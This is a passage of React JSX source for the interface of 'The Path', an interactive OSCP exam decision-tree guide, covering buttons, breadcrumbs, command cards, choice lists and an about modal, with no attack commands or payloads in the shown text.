              border: "1px solid #1e2838",
              color: "#8899aa",
              padding: "5px 12px",
              cursor: "pointer",
              fontFamily: "inherit",
              fontSize: 15,
              letterSpacing: 2,
              borderRadius: 2,
              textTransform: "uppercase",
              textDecoration: "none",
              transition: "all 0.2s",
              display: "flex",
              alignItems: "center",
              gap: 6,
            }}
            onMouseEnter={e => e.currentTarget.style.borderColor = "#3a4858"}
            onMouseLeave={e => e.currentTarget.style.borderColor = "#1e2838"}
          >
            ⎇ github
          </a>
          <button
            onClick={() => setShowAbout(true)}
            style={{
              background: "transparent",
              border: "1px solid #1e2838",
              color: "#8899aa",
              padding: "5px 12px",
              cursor: "pointer",
              fontFamily: "inherit",
              fontSize: 15,
              letterSpacing: 2,
              borderRadius: 2,
              textTransform: "uppercase",
              transition: "all 0.2s",
            }}
            onMouseEnter={e => e.currentTarget.style.borderColor = "#3a4858"}
            onMouseLeave={e => e.currentTarget.style.borderColor = "#1e2838"}
          >? about</button>
          <button
            onClick={back}
            disabled={history.length <= 1}
            style={{
              background: "transparent",
              border: "1px solid #1e2838",
              color: history.length > 1 ? "#8899aa" : "#2a3040",
              padding: "5px 12px",
              cursor: history.length > 1 ? "pointer" : "default",
              fontFamily: "inherit",
              fontSize: 17,
              letterSpacing: 2,
              borderRadius: 2,
              textTransform: "uppercase",
              transition: "all 0.2s",
            }}
            onMouseEnter={e => { if (history.length > 1) e.currentTarget.style.borderColor = "#3a4858"; }}
            onMouseLeave={e => { e.currentTarget.style.borderColor = "#1e2838"; }}
          >← back</button>

          <button
            onClick={reset}
            style={{
              background: "transparent",
              border: "1px solid #3a1a1a",
              color: "#ff4d6a",
              padding: "5px 12px",
              cursor: "pointer",
              fontFamily: "inherit",
              fontSize: 17,
              letterSpacing: 2,
              borderRadius: 2,
              textTransform: "uppercase",
              transition: "all 0.2s",
            }}
            onMouseEnter={e => e.currentTarget.style.background = "#ff4d6a18"}
            onMouseLeave={e => e.currentTarget.style.background = "transparent"}
          >⟳ reset</button>
        </div>
      </header>

      {/* ── BREADCRUMB TRAIL ───────────────── */}
      <div style={{
        width: "100%",
        maxWidth: 1100,
        padding: "10px 28px 4px",
        boxSizing: "border-box",
        display: "flex",
        alignItems: "center",
        gap: 6,
        flexWrap: "wrap",
        fontSize: 13,
        color: "#3a4858",
        letterSpacing: 1,
        overflowX: "auto",
      }}>
        <span style={{ color: "#2a3848", fontSize: 11, letterSpacing: 2, textTransform: "uppercase", marginRight: 4 }}>path:</span>
        {history.map((h, i) => {
          const n = nodes[h];
          const p = PHASES[n?.phase] || PHASES.RECON;
          const isCurrent = i === history.length - 1;
          return (
            <span key={i} style={{ display: "flex", alignItems: "center", gap: 6 }}>
              <span
                onClick={() => {
                  if (!isCurrent) setHistory(prev => prev.slice(0, i + 1));
                }}
                style={{
                  color: isCurrent ? p.color : "#3a5068",
                  cursor: isCurrent ? "default" : "pointer",
                  background: isCurrent ? `${p.color}12` : "transparent",
                  border: isCurrent ? `1px solid ${p.color}30` : "1px solid transparent",
                  borderRadius: 2,
                  padding: "1px 6px",
                  fontSize: 12,
                  letterSpacing: 1,
                  textTransform: "uppercase",
                  transition: "all 0.2s",
                  whiteSpace: "nowrap",
                }}
                title={isCurrent ? "" : `Jump back to ${n?.title}`}
              >
                {p.icon} {n?.title?.replace(/[^a-zA-Z0-9 \-→]/g, "").trim().slice(0, 22) || h}
              </span>
              {i < history.length - 1 && (
                <span style={{ color: "#1e2838", fontSize: 10 }}>›</span>
              )}
            </span>
          );
        })}
        <span style={{ marginLeft: "auto", color: "#2a3848", fontSize: 11, letterSpacing: 1 }}>
          step {history.length} · press 1-9 to choose · backspace = back
        </span>
      </div>

      {/* ── MAIN CARD ──────────────────────── */}
      <main style={{
        width: "100%",
        maxWidth: 1100,
        padding: "16px 28px 48px",
        boxSizing: "border-box",
      }}>
        <div
          key={animKey}
          style={{
            animation: "fadeSlide 0.25s ease-out both",
          }}
        >
          {/* Card */}
          <div style={{
            background: "#0c1018",
            border: `1px solid ${phase.color}2a`,
            borderRadius: 6,
            overflow: "hidden",
            boxShadow: `0 0 60px ${phase.color}0d`,
            transition: "border-color 0.4s, box-shadow 0.4s",
          }}>

            {/* Card top bar */}
            <div style={{
              background: `linear-gradient(90deg, ${phase.color}14 0%, transparent 70%)`,
              borderBottom: `1px solid ${phase.color}20`,
              padding: "18px 24px 14px",
            }}>
              <div style={{
                fontSize: 16,
                letterSpacing: 4,
                color: phase.color,
                textTransform: "uppercase",
                marginBottom: 8,
                opacity: 0.7,
              }}>
                {`[ ${node.phase} // STEP ${history.length} ]`}
              </div>
              <h1 style={{
                margin: 0,
                fontSize: 26,
                fontWeight: 700,
                color: "#e8f0f8",
                letterSpacing: 0.5,
                lineHeight: 1.2,
              }}>
                {node.title}
              </h1>
            </div>

            {/* Card body */}
            <div style={{ padding: "20px 24px 24px" }}>

              {/* Body text */}
              <p style={{
                margin: "0 0 20px",
                fontSize: 17,
                lineHeight: 1.9,
                color: "#8899aa",
                paddingLeft: 14,
                borderLeft: `2px solid ${phase.color}55`,
              }}>
                {node.body}
              </p>

              {/* Warning */}
              
            {node.warn && (
                <div style={{
                  background: "#1a1200",
                  border: "1px solid #ffd16633",
                  borderLeft: "3px solid #ffd166",
                  borderRadius: "0 4px 4px 0",
                  padding: "10px 14px",
                  marginBottom: 20,
                  fontSize: 15,
                  color: "#ffd166cc",
                  lineHeight: 1.6,
                }}>
                  ⚠ {node.warn}
                </div>
              )}

              {/* Commands */}
              {node.cmd && (
                <div style={{ marginBottom: 24 }}>
                  <div style={{
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                    marginBottom: 6,
                  }}>
                    <span style={{
                      fontSize: 16,
                      letterSpacing: 3,
                      color: phase.color,
                      textTransform: "uppercase",
                      opacity: 0.8,
                    }}>
                      commands
                    </span>
                    <div style={{ display: "flex", gap: 8 }}>
                    <button
                      onClick={copyCmd}
                      style={{
                        background: copied ? `${phase.color}22` : "transparent",
                        border: `1px solid ${phase.color}44`,
                        color: phase.color,
                        padding: "3px 10px",
                        cursor: "pointer",
                        fontFamily: "inherit",
                        fontSize: 16,
                        letterSpacing: 2,
                        borderRadius: 2,
                        textTransform: "uppercase",
                        transition: "all 0.2s",
                      }}
                    >
                      {copied ? "✓ copied" : "copy"}
                    </button>
                    <button
                      onClick={copyObsidian}
                      style={{
                        background: copiedMd ? "#7c3aed22" : "transparent",
                        border: "1px solid #7c3aed55",
                        color: copiedMd ? "#a78bfa" : "#7c3aed",
                        padding: "3px 10px",
                        cursor: "pointer",
                        fontFamily: "inherit",
                        fontSize: 16,
                        letterSpacing: 2,
                        borderRadius: 2,
                        textTransform: "uppercase",
                        transition: "all 0.2s",
                      }}
                    >
                      {copiedMd ? "✓ vault" : "⟡ obsidian"}
                    </button>
                    
                    </div>
                  </div>
                  <pre style={{
                    background: "#060a0e",
                    border: `1px solid #1a2838`,
                    borderLeft: `3px solid ${phase.color}88`,
                    padding: "16px 18px",
                    margin: 0,
                    fontSize: 15,
                    lineHeight: 1.75,
                    color: "#7ecb9e",
                    overflowX: "auto",
                    borderRadius: "0 4px 4px 0",
                    whiteSpace: "pre",
                  }}>
                    {node.cmd}
                  </pre>
                </div>
              )}

              {/* Choices */}
              <div>
                <div style={{
                  fontSize: 16,
                  letterSpacing: 3,
                  color: "#3a4858",
                  textTransform: "uppercase",
                  marginBottom: 10,
                }}>
                  what did you find?
                </div>
                <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                  {node.choices.map((c, i) => {
                    const np = nodes[c.next];
                    const nc = PHASES[np?.phase]?.color || phase.color;
                    return (
                      <button
                        key={i}
                        onClick={() => go(c.next)}
                        style={{
                          background: `linear-gradient(90deg, ${nc}0c 0%, transparent 80%)`,
                          border: `1px solid ${nc}30`,
                          borderLeft: `3px solid ${nc}66`,
                          color: "#8899aa",
                          padding: "11px 16px",
                          cursor: "pointer",
                          fontFamily: "inherit",
                          fontSize: 16,
                          textAlign: "left",
                          borderRadius: "0 4px 4px 0",
                          transition: "all 0.15s",
                          display: "flex",
                          alignItems: "center",
                          gap: 10,
                        }}
                        onMouseEnter={e => {
                          e.currentTarget.style.background = `linear-gradient(90deg, ${nc}1a 0%, transparent 80%)`;
                          e.currentTarget.style.borderLeftColor = nc;
                          e.currentTarget.style.color = "#ddeeff";
                        }}
                        onMouseLeave={e => {
                          e.currentTarget.style.background = `linear-gradient(90deg, ${nc}0c 0%, transparent 80%)`;
                          e.currentTarget.style.borderLeftColor = `${nc}66`;
                          e.currentTarget.style.color = "#8899aa";
                        }}
                      >
                        <span style={{
                          fontSize: 16,
                          color: nc,
                          opacity: 0.8,
                          minWidth: 14,
                          fontWeight: 700,
                        }}>▶</span>
                        {c.label}
                        <span style={{
                          marginLeft: "auto",
                          fontSize: 16,
                          color: nc,
                          opacity: 0.5,
                          letterSpacing: 1,
                          textTransform: "uppercase",
                        }}>
                          {np?.phase}
                        </span>
                      </button>
                    );
                  })}
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* ── LEGEND ───────────────────────── */}
        <div style={{
          marginTop: 28,
          display: "flex",
          gap: 14,
          flexWrap: "wrap",
          justifyContent: "center",
          fontSize: 16,
          letterSpacing: 2,
          color: "#3a4858",
          textTransform: "uppercase",
        }}>
          {Object.entries(PHASES).filter(([k]) => !["FTP","SSH"].includes(k)).map(([label, { color: c, icon }]) => (
            <div key={label} style={{ display: "flex", alignItems: "center", gap: 5, opacity: node.phase === label ? 1 : 0.5, transition: "opacity 0.3s" }}>
              <div style={{ width: 6, height: 6, background: c, borderRadius: 1, boxShadow: node.phase === label ? `0 0 8px ${c}` : "none", transition: "box-shadow 0.3s" }} />
              {label}
            </div>
          ))}
        </div>
      </main>

      {/* ── ABOUT MODAL ────────────────────── */}
      {showAbout && (
        <div
          onClick={() => setShowAbout(false)}
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(0,0,0,0.85)",
            zIndex: 100,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            padding: 24,
          }}
        >
          <div
            onClick={e => e.stopPropagation()}
            style={{
              background: "#0c1018",
              border: "1px solid #3b9eff33",
              borderRadius: 8,
              padding: "36px 40px",
              maxWidth: 560,
              width: "100%",
              fontFamily: "inherit",
              boxShadow: "0 0 80px #3b9eff18",
            }}
          >
            <div style={{ fontSize: 22, fontWeight: 800, letterSpacing: 4, color: "#3b9eff", marginBottom: 6, textTransform: "uppercase" }}>
              The Path
            </div>
            <div style={{ fontSize: 12, letterSpacing: 3, color: "#3a4858", textTransform: "uppercase", marginBottom: 24 }}>
              OSCP Field Guide
            </div>
            <p style={{ color: "#6a7a8a", lineHeight: 1.8, fontSize: 14, marginBottom: 16 }}>
              An interactive decision-tree methodology for OSCP exam day and offensive security practice.
              148 nodes covering every attack domain — web, AD, Linux, Windows, pivoting, shells,
              documentation, and the inner game of operating under pressure.
            </p>
            <p style={{ color: "#6a7a8a", lineHeight: 1.8, fontSize: 14, marginBottom: 24 }}>
              Built for practitioners who need a tool that thinks with them — not just a cheatsheet,
              but a guide that makes decisions, surfaces failure modes, and keeps you oriented
              when the clock is running.
            </p>
            <div style={{ borderTop: "1px solid #1e2838", paddingTop: 20, display: "flex", flexDirection: "column", gap: 8 }}>
              <div style={{ fontSize: 13, color: "#4a5568" }}>
                Built by <span style={{ color: "#cdd6e0" }}>Braxton Bailey</span> <span style={{ color: "#3a4858" }}>(jimi421)</span> — Security practitioner, perpetual student.
              </div>
              <div style={{ display: "flex", gap: 12, marginTop: 8 }}>
                <a href="https://github.com/jimi421/patha" target="_blank" rel="noopener noreferrer"
                  style={{ color: "#3b9eff", fontSize: 13, letterSpacing: 2, textDecoration: "none", textTransform: "uppercase", border: "1px solid #3b9eff33", padding: "4px 12px", borderRadius: 2 }}>
                  ⎇ GitHub
                </a>
                <a href="https://www.linkedin.com/in/braxtonb-dev" target="_blank" rel="noopener noreferrer"
                  style={{ color: "#3b9eff", fontSize: 13, letterSpacing: 2, textDecoration: "none", textTransform: "uppercase", border: "1px solid #3b9eff33", padding: "4px 12px", borderRadius: 2 }}>
                  LinkedIn
                </a>
              </div>
            </div>
            <button
              onClick={() => setShowAbout(false)}
              style={{
                position: "absolute",
                display: "none",
              }}
            />
            <div style={{ marginTop: 20, fontSize: 11, color: "#2a3848", letterSpacing: 1 }}>
              Press ESC to close · Not affiliated with OffSec
            </div>
          </div>
        </div>
      )}

      <style>{`
        @keyframes fadeSlide {
          from { opacity: 0; transform: translateY(8px); }
          to   { opacity: 1; transform: translateY(0); }
        }
        * { box-sizing: border-box; }
        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-track { background: #080b0f; }
        ::-webkit-scrollbar-thumb { background: #1e2838; border-radius: 2px; }
        button:focus { outline: none; }
        pre { scrollbar-width: thin; scrollbar-color: #1e2838 #060a0e; }
      `}</style>
    </div>
  );
}
